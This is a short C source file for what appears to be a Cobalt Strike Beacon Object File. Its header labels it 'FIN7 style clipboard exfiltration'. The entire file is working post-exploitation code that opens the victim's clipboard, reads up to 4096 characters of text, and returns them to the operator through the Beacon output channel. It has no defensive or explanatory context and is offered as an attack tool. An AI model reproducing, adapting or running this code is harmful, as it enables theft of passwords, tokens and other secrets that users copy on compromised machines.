/*
 * clipboard_dump.c - Clipboard contents grab
 * FIN7 style clipboard exfiltration
 */
#include <windows.h>
#include <stdio.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI USER32$CloseClipboard(void);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI USER32$IsClipboardFormatAvailable(UINT);

void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    if (!USER32$OpenClipboard(NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to open clipboard");
        return;
    }

    if (USER32$IsClipboardFormatAvailable(CF_TEXT)) {
        HANDLE hData = USER32$GetClipboardData(CF_TEXT);
        if (hData) {
            char* text = (char*)GlobalLock(hData);
            if (text) {
                int len = 0;
                while (text[len] && len < 4096) len++;
                if (len > 0) {
                    BeaconPrintf(CALLBACK_OUTPUT, "=== Clipboard (CF_TEXT, %d chars) ===", len);
                    BeaconOutput(CALLBACK_OUTPUT, text, len);
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "Clipboard is empty");
                }
                GlobalUnlock(hData);
            }
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "No text in clipboard");
    }

    USER32$CloseClipboard();
}
